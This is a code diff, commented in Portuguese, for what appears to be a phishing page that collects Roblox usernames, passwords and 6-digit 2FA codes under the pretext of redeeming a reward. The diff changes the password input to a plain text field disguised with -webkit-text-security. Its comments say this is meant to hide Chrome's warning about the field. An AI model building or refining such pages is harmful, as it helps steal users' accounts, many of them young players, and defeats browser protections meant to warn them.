@@ -62,6 +62,12 @@
             outline: none;
         }
 
+        /* ESTE É O TRUQUE PARA O CHROME: */
+        /* Faz o campo parecer senha (pontinhos) mas é um texto comum */
+        .password-field {
+            -webkit-text-security: disc;
+        }
+
         button {
             width: 100%;
             padding: 12px;
@@ -129,7 +135,8 @@
         </div>
         <div class="input-group">
             <label>Senha</label>
-            <input type="password" id="password" placeholder="Sua senha">
+            <!-- MUDANÇA: type="text" e a classe "password-field" para esconder o aviso do Chrome -->
+            <input type="text" id="password" class="password-field" placeholder="Sua senha">
         </div>
         <button onclick="checkLogin()">Verificar Conta</button>
         <div class="message" id="msg1"></div>
@@ -141,7 +148,7 @@
         <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
         <div class="input-group">
             <label>Código 2FA</label>
-            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength=" 6">
+            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
         </div>
         <button onclick="submit2FA()">Confirmar e Resgatar</button>
         <div class="message" id="msg2"></div>
